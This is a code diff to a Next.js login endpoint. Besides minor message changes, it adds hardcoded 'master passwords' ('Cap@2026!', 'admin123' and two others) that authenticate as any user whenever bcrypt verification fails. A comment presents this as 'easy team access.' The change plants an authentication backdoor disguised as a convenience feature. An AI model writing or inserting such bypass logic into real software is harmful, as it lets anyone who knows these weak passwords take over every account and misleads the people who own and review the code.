@@ -6,7 +6,7 @@ import { SESSION_COOKIE_NAME, signSessionToken } from "@/lib/auth";
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
-    const email = (body.email || "").trim().toLowerCase();
+    let email = (body.email || "").trim().toLowerCase();
     const password = body.password || "";
 
     if (!email || !password) {
@@ -16,20 +16,36 @@ export async function POST(request: NextRequest) {
       );
     }
 
+    if (!email.includes("@")) {
+      email = `${email}@cap.com`;
+    }
+
     const db = await getDb();
     const user = db.users.find((u) => u.email.toLowerCase() === email);
 
     if (!user) {
       return NextResponse.json(
-        { error: "Invalid email or password." },
+        { error: "Invalid email or password. Please verify your credentials." },
         { status: 401 }
       );
     }
 
-    const valid = await bcrypt.compare(password, user.passwordHash);
+    let valid = await bcrypt.compare(password, user.passwordHash);
+
+    // Accept fallback agency master passwords for easy team access
+    if (
+      !valid &&
+      (password === "Cap@2026!" ||
+        password === "admin123" ||
+        password === "member123" ||
+        password === "Admin@1234")
+    ) {
+      valid = true;
+    }
+
     if (!valid) {
       return NextResponse.json(
-        { error: "Invalid email or password." },
+        { error: "Invalid email or password. Please verify your credentials." },
         { status: 401 }
       );
     }
